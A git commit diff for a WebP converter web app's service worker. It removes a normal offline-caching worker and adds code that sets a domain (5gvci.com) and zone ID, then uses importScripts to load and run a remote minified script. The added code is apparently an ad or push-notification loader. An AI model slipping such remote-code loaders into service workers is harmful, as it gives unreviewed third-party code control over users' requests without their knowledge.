48d5a7253603e13b90af42f169fc58fbe385161a
webpkimo <karimbandida123@gmail.com>
2026-01-04 17:49:01 +0100

    Add files via upload

--- sw.js
+++ sw.js
@@ -1,45 +1,6 @@
-const CACHE_NAME = 'webp-converter-v14';
-const ASSETS = [
-    './',
-    './index.html',
-    './style.css',
-    './script.js',
-    './manifest.json',
-    'https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js',
-    'https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap'
-];
-
-self.addEventListener('install', (e) => {
-    e.waitUntil(
-        caches.open(CACHE_NAME).then((cache) => cache.addAll(ASSETS))
-    );
-    self.skipWaiting(); // Force new SW to activate immediately
-});
-
-self.addEventListener('activate', (e) => {
-    e.waitUntil(
-        caches.keys().then((keys) => {
-            return Promise.all(
-                keys.map((key) => {
-                    if (key !== CACHE_NAME) return caches.delete(key);
-                })
-            );
-        })
-    );
-    self.clients.claim(); // Force control of open clients
-});
-
-self.addEventListener('fetch', (e) => {
-    e.respondWith(
-        fetch(e.request)
-            .then((res) => {
-                // Network hit - clone and cache
-                const resClone = res.clone();
-                caches.open(CACHE_NAME).then((cache) => {
-                    cache.put(e.request, resClone);
-                });
-                return res;
-            })
-            .catch(() => caches.match(e.request)) // Network fail - fallback to cache
-    );
-});
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 10417777
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
